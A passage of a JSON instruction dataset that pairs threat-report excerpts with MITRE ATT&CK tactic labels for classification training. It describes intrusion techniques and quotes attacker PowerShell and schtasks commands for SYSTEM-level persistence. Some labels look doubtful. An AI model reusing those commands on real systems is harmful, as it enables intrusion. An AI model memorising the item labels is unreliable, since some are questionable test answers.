        "input": "Described attack activity: Symantec researchers have uncovered extensive insights into a cyber espionage group behind a recent series of cyber attacks designed to gather intelligence on targets spread primarily across the Middle East as well as in Europe and North America.\nThe group, which we call Seedworm (aka MuddyWater), has been operating since at least 2017, with its most recent activity observed in December 2018.\nAnalysts in ourDeepSight Managed Adversary and Threat Intelligence(MATI) team have found a new backdoor,Backdoor.Powemuddy, new variants of Seedworm's Powermud backdoor (aka POWERSTATS), a GitHub repository used by the group to store their scripts, as well as several post-compromise tools the group uses to exploit victims once they have established a foothold in their network.",
        "output": "other",
        "source": "Symentec"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: This vulnerability can be dangerous in one of two scenarios:\nA user unknowingly downloads a malicious container image with a bad tar. The attacker can push such an image to any registry (e.g. Docker Hub) for a popular image he has control of or rely on typosquatting. \nAn attacker compromises a running container by exploiting another vulnerability or in some cases he may have legitimate access to a container. The attacker then plants a malicious tar replacing the original tar of the image.\nA sophisticated attacker will also conceal the exploit by making the malicious tar include the originally requested files in its output, or make the symlink file a dotfile, so that the attack is not immediately apparent.\nSo far I have only mentioned directory traversal, which is dangerous by itself. Kubectl users are generally developers, devops staff, or administrators, whose environment contains sensitive configuration and deployment files. Targeted exploitation of this vulnerability can thus lead to leakage and exfiltration of potentially highly sensitive information. Nevertheless, you may be wondering how straightforward it is for an attacker to get full code execution on the user machine through this vulnerability.\nFirst, if kubectl is run as root, achieving remote code execution becomes trivial through the modification of one of many configuration or system files. Files like /etc/profile or cron files are good targets, but virtually any startup file are easy targets to get immediate and persistent code execution.\nYet kubectl is more commonly run as a user. This makes it harder for an attacker to deterministically get code execution. It eventually sums up to the creativity of the attacker or how much information about the user filesystem may be known, but for the sake of this post I present a simple idea that may work in many cases.\nIn the proof of concept found below, I get code execution by writing to the.bashrcfile in the directory kubectl is run from. The path /proc/self/cwd links to that directory. If kubectl is ran from the user's home directory, the bash loading script is replaced with my payload which is run the next time a bash shell is spawned by the user.",
        "output": "impact",
        "source": "Palo"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: On the third day of the intrusion, after moving laterally, the threat actors began to review sensitive documents stored on network shares, including revenue, insurance, and password storage documents.\nThese documents were again reviewed by the threat actor on the final day of the intrusion. Later the threat actor viewed the stolen files off network, observed by triggered canary tokens, which revealed connections from an AWS EC2 instance.",
        "output": "collection",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The threat actor made use of a custom developed implementation of Zerologon (CVE-2020-1472) executed from a file named \"zero.exe\".\nOnce \"zero.exe\" is run it will provide the threat actor with the NTLM hash of the specified username, a Domain Administrator account in this case.\nOn the Domain Controller a service (Event ID 7045) will be created that will run the Reset-ComputerMachinePassword PowerShell Cmdlet.\nThe service will then be executed and the machine account password will be reset.\nZerologon will create an Event ID 4624 for the domain controller computer account attempting to authenticate. The main red flag is the source network address IP differing from the IP of the domain controller, which in this case is set to the beachhead workstation on which zero.exe was executed.\nLastly, Event ID 4648 will be logged on the beachhead machine indicating the zero.exe process was used to connect to a domain controller.\nA blog post by Blackberry can be referenced to learn more about this custom developed Zerologon file used:https://blogs.blackberry.com/en/2021/03/zerologon-to-ransomware.\nFor more information on detecting Zerologon check out Kroll'sZerologon Exploit Detect Cheat Sheet.",
        "output": "privilege escalation",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: While having access to the Exchange server, we observed no attempts to export or access user mailboxes.",
        "output": "collection",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Ekix4.dll, a Cobalt Strike payload was executed via fodhelper UAC bypass.\nAdditional Cobalt Strike payloads were executed with the same fodhelper UAC bypass technique.\nCobalt Strike payloads were used to escalate privileges to SYSTEM via a service created to run a payload using rundll32.exe as the LocalSystem user.  This activity was observed on workstations, a file server, and a backup server.\nGetSystem was also used by the threat actors.",
        "output": "privilege escalation",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Sensitive documents (.pdf, .docx) were viewed in a RDP session on the file server using Notepad++ and Wordpad. After this, no further activity from the threat actor was observed.",
        "output": "impact",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: CISA observed the threat actor using the techniques identified in table 4 to establish persistence. \nTable 4: Persistence techniques ",
        "output": "persistence",
        "source": "Mitre"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The threat actor utilized process injection techniques, such as injecting into WUAUCLT.exe, a legitimate process, to access critical system resources, including the LSASS memory space.\nAdditionally, the threat actor created and executed scheduled tasks under SYSTEM privileges to maintain persistence. For example, they deployed DLL files (svcmc.dll and svcmcc.dll) via scheduled tasks, ensuring their execution at system startup. These tasks were created and run using the following commands:\nFurthermore, administrative privileges were leveraged during the lateral movement to execute a PowerShell-based Cobalt Strike payload on a file server. The threat actor also utilized SMB to transfer tools such as the SystemBC DLL and a Golang backdoor, both of which were executed through SYSTEM-level scheduled tasks.",
        "output": "privilege escalation",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: During the initial execution of IcedID, the following two files were created under the AppData Roaming folder of the user that executed it:\nCadiak.dll: IcedID first stage. \nlicense.dat: Encoded version of the second stage, which gets loaded into memory by the first stage.\nA scheduled task was created that contained instructions for executing the IcedID DLL and the location of the license.dat file. This is a very common method that IcedID uses for persistence.\nThe scheduled task was configured to execute at logon under the user that initially executed the IcedID payload.\nLater in the intrusion, AnyDesk was installed with a command line option that established persistence, running when Windows starts by creating a Service:\nDuring the deployment of AnyDesk, a service creation event was generated under the System channel:\nAlerting on every service creation is usually far too noisy for any meaningful review by security operations personnel, but it can be very helpful to alert on specific patterns of remote monitoring and management (RMM) installation artifacts. There are many approaches fordetecting RMM tools through resilient patternsof file paths or digital signatures. These legitimate tools may not trigger alerts in endpoint detection products by default, so it is important for security teams to create custom detections. As seen in various previous cases here at The DFIR Report, and also on other platforms, RMM tools provide a very easy way to get access to systems with interactive capabilities.",
        "output": "persistence",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: During this intrusion, threat actors used a number of different techniques to move laterally across the domain. The techniques used will be detailed in the following sections.\nT1021.006 Remote Services: WinRM\nSome of the threat actors' lateral activity was executed using WinRM, this could be observed by matching parent-child process trees and DCE RPC traffic.\nT1047 WMI\nThreat Actors ran the following command to download and execute an in memory PowerShell payload on a domain controller:\nWMI was also used also when executing remote DLL beacons:\nWMI commands were also observed during ransom deployment:\nT1021.002 Remote Services: SMB/Windows Admin Shares\nThe threat actors relied on SMB to move their tools throughout the network during the intrusion.\nThe threat actors used PSExec to move laterally to servers during the ransom execution, the -r flag was used to rename the binary created on the remote server tomstdc.exe.\nBelow are some of the PsExec forensic artifacts logged in Windows Event Logs and Sysmon:\nOverview of the mstdc.exe binary (renamed psexecsvc.exe):\nRenaming PsExec is likely an action taken by threat actors to bypass basic PsExec anomaly rules. However, there are Sigma rules which detect this specific technique, assharedby Florian Roth back in 2019.\nThey also employed use of the Windows copy utility to move files around the network via SMB:\nT1021.001 Remote Services: RDP\nThreat actors also used RDP during this intrusion. Below is an example of forensic artifacts left after using RDP to move laterally from the beachhead to one of the domain servers logged in Windows Event Logs using different providers:",
        "output": "lateral movement",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The attacker deployed the Interlock ransomware encryptor binary with the file name \"conhost.exe\", masquerading as a legitimate file, onto the victim machine and stored it in a folder named with a single digit number (example: \"3\" or \"4\") in the user profile application data temporary folder. When run, the ransomware encrypts the targeted files on the victim machine with the file extension \".Interlock\" and drops the ransom note \"!__README__!.txt\" file in every folder containing files that the encryptor has attempted to encrypt. Talos IR also observed that the attacker configured the ransom note to display during interactive login, was pushed using Group Policy Objects (GPOs), a Windows utility that allows users to manage Windows operating systems and applications. \nIn the ransom note, the attacker warns against attempting to recover the encrypted files and rebooting the affected machines. They also demand a response within 96 hours or else they threaten to release the victim's data on their leak site and notify the media outlets, which could lead to financial and reputational damage. \nThe ransom note includes the URL for an onion site where the affected victims can contact the operator to discuss the ransom demand and purchase the decryption keys using a unique company ID of sixty alphanumeric characters generated for each victim. ",
        "output": "impact",
        "source": "Cisco"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The threat actor repeatedly modified the address of the loopback interface on a compromised switch and used that interface as the source of SSH connections to additional devices within the target environment, allowing them to effectively bypass access control lists (ACLs) in place on those devices (see \"Infrastructure pivoting\" section). ",
        "output": "defense evasion",
        "source": "Cisco"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: As threat actors are not always successful in completing their objectives, it can result in our data set having visibility gaps for the Impact tactic. This may be caused by various reasons, the threat actors may be evicted, the environment may not align with their goals, they may be unable to escalate to a high enough privilege to complete their objective or the threat actors stole data but did not encrypt the environment. That being said our data set still has Data Encrypted for Impact  T1486 as the most common impact technique.\nEmotet Strikes Again  LNK File Leads to Domain Wide Ransomware \nQuantum Ransomware \nStolen Images Campaign Ends in Conti Ransomware",
        "output": "impact",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: One common theme seen across the majority of the intrusions has been the reliance on Cobalt Strike for performing post-exploitation activities. In almost all cases, the initial access brokers such as Trickbot and Bazar, dropped multiple Cobalt Strike beacons across the victim environment.\nFor an in-depth breakdown of some of the network operations of Cobalt Strike see ourrecent report on the topic.",
        "output": "command and control",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: In DART's post ransomware investigation of this engagement, the team found multiple instances of scheduled tasks and services being created by the attack for persistence after they had gained access to highly privileged credentials. Services and Scheduled Tasks have the option to run as NT AUTHORITY\\System, allowing their malicious code to run with highly privileged access. Because the actor created those tasks and services on a domain controller, the Local SYSTEM access allowed them to easily access domain administrator accounts. The deployment of a backdoor to a domain controller can help an actor bypass common incident response recovery activity, such as resetting compromised accounts, in the hope of staying resident on the network. ",
        "output": "persistence",
        "source": "microsoft"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Once the attackers gained access to the target environment, they then used SMB to copy over and launch the Total Deployment Software administrative tool, allowing remote automated software deployment. Once this tool was installed, the attackers used it to install ScreenConnect (now known as ConnectWise), a remote desktop software application. ",
        "output": "lateral movement",
        "source": "microsoft"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: We weren't able to determine the initial attack vector for all the cases observed in 2024. However, based on the data available to us, we assume that spearphishing was the only attack vector used by MirrorFace. The group impersonates trusted organizations or individuals to convince recipients to open documents or click links. The following findings on initial access align with those in the Trend Micro article, although they are not entirely the same.\nSpecifically, in Operation AkaiRy\u016b, MirrorFace abused both McAfee-developed applications and also one developed by JustSystems to run ANEL. While Trend Micro reported Windows Management Instrumentation (WMI) andexplorer.exeas the execution proxy pair for ANEL, we unearthed another pair: WMI andwlrmdr.exe(Windows logon reminder). We also provide an email conversation between a disguised MirrorFace operator and a target.",
        "output": "initial access",
        "source": "Weblive"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Microsoft 365 Defender built-in detection: Multiple searches for sensitive data in SharePoint sites \nThis detection looks for instances where a user searched for sensitive data on SharePoint sites that an attacker can use as internal information to leverage in later attacks if the user's account is compromised. \nInvestigate the user account performing the queries to determine if it was compromised. Determine what, if any, sensitive information was accessed to assess the impact. \nNote: Data used in this detection requires advanced audit to be enabled in Microsoft Defender 365 that includes the SearchQueryInitiatedSharePoint event type. ",
        "output": "other",
        "source": "Mitre"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: After I reversed the malware, especially the part that handles the C2, I wanted to discover whether this campaign was still up and running.\nI set up a brand new virtual machine, downloaded Tor and started looking for an IRC client that supportsSOCKS5, the proxy protocol that is needed in order to connect through Tor. IRC is a very old protocol and is less popular today than it was 20 years ago. Furthermore, IRC came out almost a decade beforeSOCKS5. I found HexChat, a simple, lightweight IRC client that supports bothSOCKS5and connecting tooniondomains.\nWhen our Silospace sample was originally executed, its command line argument for the IRC username wasphp_35, so I decided to use this username when connecting to the C2 server from HexChat, thinking it would appear legitimate to the attacker.\nI connected to the server and discovered it was still working. I joined#WindowsKubernetesjust like Siloscape does. There were 23 active victims there and a channel operator namedadmin.\nUnfortunately, after about two minutes, I was noticed and kicked out of the server. Two minutes after that, the server was no longer active  at least not at the originaloniondomain I used.\nWhat Can We Learn?\nWhen I went over my findings, the first thing that came to mind is that there were many more active users on the C2 server than I actually saw in the#WindowsKuberneteschannel  313 users in total, to be exact. This implies that the Siloscape malware was just a small part of a bigger campaign.\nSadly, when I connected to the server, the channels list was empty, indicating that the server was configured to not reveal its channels. Therefore, I couldn't get more information from the channel names.\nThe second and more important detail that stood out was the convention used for the victims' names. Our name wasphp_35, and when our sample of Siloscape first executed, it indeed was executed through a vulnerable php instance. The other names clearly suggest the way the attacker managed to achieve code execution (sqlinjprobably means SQL injection):\n@admin sqlinj_64 sqlinj_51 php_34 weblogic_12 sqlinj_138 weblogic_19 php_66 sqlinj_87 sqlinj_8 sqlinj_33 sqlinj_114 activemq_5 sqlinj_44 tomcat_9 sqlinj_52 sqlinj_107 redis_10 php_76 sqlinj_28 activemq_25 sqlinj_35 php_8 weblogic_31 php_35\nThe last piece of information I was able to obtain from the C2 is the creation date of the server: Jan. 12, 2020. Note that this doesn't necessarily mean that Siloscape was created on that date. Instead, it's likely the campaign started at that time.",
        "output": "command and control",
        "source": "Palo"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: To gain access to a victim environment, APT29 sent spear-phishing emails disguised as embassy administrative updates. These phishing emails used legitimate, but compromised email addresses from other diplomatic entities. APT29 targeted large lists of recipients that Mandiant suspected were primarily publicly listed points of contact of embassy personnel. These phishing emails utilized a malicious HTML dropper tracked as ROOTSAW, that makes use of a technique known as HTML smuggling to deliver an IMG or ISO file to a victim system. \nWhen opened, the ROOTSAW HTML dropper will write an IMG or ISO file to disk. On Windows 10 or later, the image file is mounted when double-clicked and the user is presented with the image file as the folder contents in Windows Explorer. The image file contains two additional files, a Windows shortcut (LNK) file and a malicious DLL. If the user clicks the LNK file, the \"Target\" command will execute as normal. This mechanism lures the victim into \nTracking APT29 Phishing Campaigns | Atlassian Trello | Google Cloud Blog opening the LNK file and thus inadvertently launches the malicious DLL. \nFiles contained within image files, like mounted ISO files, will not contain the Zone.Identifier Alternate Data Stream (ADS) flag that indicates the files have been downloaded from the internet (so called \"mark-of-the-web\") as reported by Didier Stevens. This prevents a Windows operating system warning message for files opened from ISO or IMG image files. \nThe LNK utilized by APT29 in the early waves of this campaign shared multiple characteristics with those identified in campaigns from 2021, including the use of a specific icon location, as well as the machine ID and MAC address. One technique observed being used by APT29 was using LNK file extensions that have a different icon than the target application or document, making the shortcut appear as a document rather than a program to launch. This tricks the victim into opening a seemingly legitimate document. Shortcut files by default also have their LNK file extension hidden, even if the Windows Explorer \"show file extensions\" is enabled, further lowering any suspicion a shortcut instead of a document is opened. \nThe \"Target\" in the LNK will execute the DLL with rundll32.exe and one of the DLL's exports: \nMandiant also identified APT29 utilizing a malicious docx to deliver an HTA dropper, resulting in the delivery and execution of BEATDROP on a target system, in a separate but similar phishing campaign. \nBEATDROP is a downloader written in C that makes use of Trello for C2. Once executed, BEATDROP first maps its own copy of \\`ntdll.dll\\` into memory for the purpose of executing shellcode in its own process. BEATDROP first creates a suspended thread with RtlCreateUserThread which points to NtCreateFile . \nFollowing this, BEATDROP will enumerate the system for the username, computer name, and IP address. This information is used to create a victim ID, which is used by BEATDROP to store and retrieve victim payloads from its C2. Once the victim ID is created, BEATDROP will make an initial request to Trello to identify whether the current victim has already been compromised. The process to identify whether the victim is already compromised begins with a GET request to retrieve the user ID from the following URL: \nBEATDROP then uses the user ID received from the URL in Figure 9 to list the boards related to the user, which contain all current victims. \nBEATDROP enumerates the victim boards to identify if the current target exists in the database or not. If the current victim does not, BEATDROP crafts a POST request to add the victim to the database using the data enumerated from the host. \nOnce the victim is either identified or added to the database, BEATDROP will send a request to gather the victim board for the current target: \nBEATDROP will then enumerate the response to determine if a payload exists for the current victim. If one does, BEATDROP will then send a request to determine the URL to retrieve the final payload. The final URL will deliver the payload AES encrypted as its response. \nFor most of the aforementioned requests to the Trello API the key and token inserted as URL parameters is enough to retrieve the information from the Trello API. In the case of using the download API however, Trello requires the use of a header which is also embedded in the BEATDROP samples: \nAuthorization: OAuth oauth_consumer_key=\"< \nAnalysis of early BEATDROP samples identified the malware utilized an interesting User Agent when communicating with its C2. The initial User Agent string was related to Apple iPads, however Mandiant observed a shift in TTPs in later BEATDROP samples to utilizing more commonly observed Windows User Agent strings. \nBEATDROP is an ideal example of APT29's continued efforts to obfuscate its activity and maintain persistent access. Following multiple waves of phishing utilizing BEATDROP to target diplomatic entities, Mandiant along with other researchers identified APT29 moving away from BEATDROP to a novel $\\mathsf{C}\\substack{++}$ BEACON loader in their latest campaigns against diplomatic entities. Several scenarios could explain this shift in tooling including the possibility that BEATDROP was no longer providing value to the group in terms of capability, or reflective of operational TTPs to periodically retool for the purposes of evading detection. ",
        "output": "initial access",
        "source": "mandiant"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The attacker used PowerShell to create new tasks on remote machines: \n\\$scheduler $=$ New-Object -ComObject   \n(\"Schedule.Service\");\\$scheduler.Connect(\\$env:COMPUTERNAME);\\$folder $=$   \n\\$scheduler.GetFolder(\"\\Microsoft\\Windows\\SoftwareProtectionPlatform\");\\$task $=$   \n\\$folder.GetTask(\"EventCacheManager\");\\$definition $=$   \n\\$task.Definition;\\$definition.Settings.ExecutionTimeLimit $=$   \n\"PT0S\";\\$folder.RegisterTaskDefinition(\\$task.Name, $\\$9$ definition,6,\"System\",\\$null,5);echo \"Do \nThey also attempted this on a number of machines using schtasks.exe directly. For example: \nC:\\Windows\\system32\\cmd.exe /C schtasks /create /F /tn   \n\"\\Microsoft\\Windows\\SoftwareProtectionPlatform\\EventCacheManager\" /tr   \n\"C:\\Windows\\SoftwareDistribution\\EventCacheManager.exe\" /sc ONSTART /ru system   \n/S [machine_name] ",
        "output": "lateral movement",
        "source": "github_aptNote"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: T1071.001: Web ProtocolsT1090: Proxy\nT1095: Non-Application Layer Protocol T1105: Ingress Tool Transfer T1132.001: Standard Encoding T1573.002: Asymmetric Cryptography ",
        "output": "command and control",
        "source": "mandiant"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: There are several persistence mechanisms observed. The first one utilizes schtasks to create a task called \"BrowserUpdate\".\nIt also created a registry run key to execute the miner binary on reboot.\nWe also observed the Loader binary adding npf.sys (WinPcap binary) as a scheduled task.",
        "output": "persistence",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: NCC Group has observed disruption and destruction to client environments by $L A P S U S\\$8$ such as shutting down virtual machines from within on-premises VMware ESXi infrastructure, to the extreme of mass deletion of virtual machines, storage, and configurations in cloud environments making it harder for the victim to recover and for the investigation team to conduct their analysis activities. \nThe theft of data reported appears to heavily be focused on application source code or proprietary technical information. With a targeting of internal source code management or repository servers. These git repositories can contain not only commercially sensitive intellectual property, but also in some cases may include additional API keys to sensitive applications including administrative or cloud applications. ",
        "output": "impact",
        "source": "github_aptNote"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Pass the hash\nAn examination of logon activity within the environment revealed evidence pointing to pass-the-hash attacks. Specifically, Windows Security logs with event ID 4624, showing logon type 9 and the Logon Process listed as \"seclogo,\" serve as solid indicators of the pass-the-hash technique employed by the threat actor.\nThe threat actor used three main methods for lateral movement. First, Cobalt Strike utilized SMB ADMIN$ shares to move beacons laterally, along with distributing both SMB and HTTPS beacons. Secondly, they used Remote Desktop Protocol to access a file server and a backup server, where they performed discovery activity. Lastly, the threat actor used the hidden SMB share C$ to distribute the ransomware executable to strategic endpoints within the infrastructure.\nA domain controller was used as the main pivot point by the threat actor.\nOverview of lateral movement involving SMB ADMIN$ shares and RDP:\nTo investigate access to the SMB ADMIN$ share, the Windows event log proves invaluable. By examining System event ID 5145, which indicates \"A network share object was checked...,\" We can track the movement of beacons by the threat actor across the network, gaining essential insight into their lateral movements and activities.\nThe RDP Activity can be identified with windows security eventID 4624 where the logon type equals 10 RemoteInteractive  \"A user logged on to this computer remotely using Terminal Services or Remote Desktop.\"\nWindows security event ID 5145 was used to demonstrate lateral movement once again, showing SMB C$ share usage.\nCobalt Strike SMB beacons, used for lateral movement, were distributed on the beachhead and on a domain controller:\nThe configuration of the SMB beacons:\nThe threat actor's use of RDP and tunnels via SystemBC left behind crucial artifacts that helped identify their activities. Notably, we detected two hostnames, \"DESKTOP-0MEMSEA\" and \"DESKTOP-BIFFSC7\", which were used during the intrusion. These artifacts appeared in various logs, including Sysmon event ID 24 (clipboard change), Windows Security event ID 4624 (logon), event ID 4778 (terminal session reconnect), and event ID 4779 (terminal server disconnect), providing multiple points of evidence linking the threat actor's presence across the environment.\nHere is an overview of the RDP sessions where the threat actor used these two hosts:",
        "output": "lateral movement",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Unit 42 researchers have been tracking a widespread malicious JavaScript (JS) injection campaign that redirects victims to malicious content such as adware and scam pages. This threat was active throughout 2022 and continues to infect websites in 2023.\nWe detected the injected JS code on more than 51,000 websites, including hundreds of websites in Tranco's top 1 million website ranking list. The presence of affected websites in Tranco indicates that this campaign could have impacted a large number of people.\nWe also found that this campaign is multifaceted in that it performs multistep injections before redirecting to malicious web pages, and uses obfuscation and benign append attacks to bypass detections. Malware authors leverage these techniques to inject multiple variants of malicious JS code samples into the websites.\nOur novel adversarial deep learning technique, Innocent Until Proven Guilty (IUPG), detected multiple variants of the injected JS code. This model is part of the Advanced URL Filtering (AUF) subscription of our Next-Generation Firewall offering. It detects malicious JS samples and classifies content from both our offline crawlers as well as inline protection, which performs a real-time analysis of traffic on the firewall.",
        "output": "other",
        "source": "Palo"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: We have not determined the initial access vector used in this campaign. We have not identified evidence of pre-authentication exploitation to date. Our investigation is ongoing, and we will provide updates, if necessary, in the security advisories or on this blog. ",
        "output": "initial access",
        "source": "Cisco"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Upon execution, the JS file will be executed by wscript. Wscript then gives way to Regsrv32 which loads a txt file into memory. The txt file however is actually a DLL file that once loaded into memory runs under the regsrv32 process.\nThe use of these infection methods were able to bypass several security layers including Windows Defender at the time of run but we witnessed it detect the txt DLL and eat the file on disk while missing the running executable running in memory.\nWhile several infections witnessed during the campaign never moved past beaconing to the Ursnif C2 at 8.208.90.28 with the DLL in memory, some samples proceeded further.",
        "output": "execution",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Darknet markets have allowed cybercriminals, fraudsters and criminals who trade in weapons, drugs and illegal products to trade without much concern of getting caught due to the anonymity provided by the deep-web. Though it may be difficult to identify the perpetrators who are managing or using the darknet markets for their profit, global law-enforcement agencies are continuously working to bring the criminals behind the darknet markets to justice and the number of successful cases has been growing where many criminals behind the darknet markets have beenarrested. Large percentage of internet and online service users are often unaware of the threats in the digital world and tend to not follow common online safety measures to secure their personal information or their systems, which eventually result in their personal data being stolen and traded in darknet markets, where the information are further used to commit fraud. It is imperative to have an understanding on how these criminals operate and the type of information being traded to better secure ourselves.\nOrganisations should follow industry standards on securing data and implement security technologies to prevent cyber attacks and reduce the risk of data being stolen and traded in the darknet markets. Palo Alto Networks Next-Generation security platform provides a holistic solution to protect the digital way of life by safely enabling applications and preventing known and unknown threats across the network, cloud and endpoints. For more information on the next-generation security platform visithere.\nReferences:\nhttp://blog.paloaltonetworks.com/2016/08/unit42-exploring-the-cybercrime-underground-part-1-an-introduction/ \nhttps://en.wikipedia.org/wiki/Silk_Road_(marketplace) \nhttps://en.wikipedia.org/wiki/Darknet_market#/media/File:Marketlifetimes.png \nhttps://gitweb.torproject.org/torspec.git/tree/address-spec.txt \nhttps://svn.torproject.org/svn/projects/design-paper/tor-design.pdf \nhttps://en.wikipedia.org/wiki/Credit_score \nhttp://digitalindia.gov.in/content/about-programme \nhttps://www.deepdotweb.com/tag/arrested/ \nhttps://www.ag.gov.au/RightsAndProtections/IdentitySecurity/Pages/Trends-in-Identity-Crime.aspx \nhttp://cybersecurityventures.com/hackerpocalypse-cybercrime-report-2016/ \nhttps://www.juniperresearch.com/press/press-releases/cybercrime-cost-businesses-over-2trillion \nhttps://www.afp.gov.au/what-we-do/crime-types/fraud/identity-crime \nhttp://www.abs.gov.au/ausstats/abs@.nsf/mf/4528.0/ \nhttps://www.ag.gov.au/RightsAndProtections/IdentitySecurity/Documents/Identity-crime-and-misuse-in-Australia-2016.pdf \nhttp://www.lockheedmartin.com/content/dam/lockheed/data/corporate/documents/LM-White-Paper-Intel-Driven-Defense.pdf \nhttps://www.paloaltonetworks.com/products/designing-for-prevention/security-platform",
        "output": "other",
        "source": "Palo"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The threat actor removed files and artifacts from hosts throughout the intrusion. For example the more_eggs payload deleted its own DLL after execution.\nThis behavior continued throughout the intrusion.\nDuring the intrusion, after the threat actor pivoted to a backup server we observed a log event for Windows Defender being disabled. We observed no process event tied to this so we assess that this action was performed by the threat actor in the GUI with their RDP session.\nNamed pipes\nFrom the Cobalt Strike regsvr32 process we observed usage of default Cobalt Strike named pipes.\nPipes observed:",
        "output": "defense evasion",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Archive Collected Data: Archive via Utility  T1560.001 \nTo collect data, APT41 downloaded a portable archiver file to compromised devices. The group archived the necessary files and exfiltrated them to their intermediate server. ",
        "output": "collection",
        "source": "Mitre"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
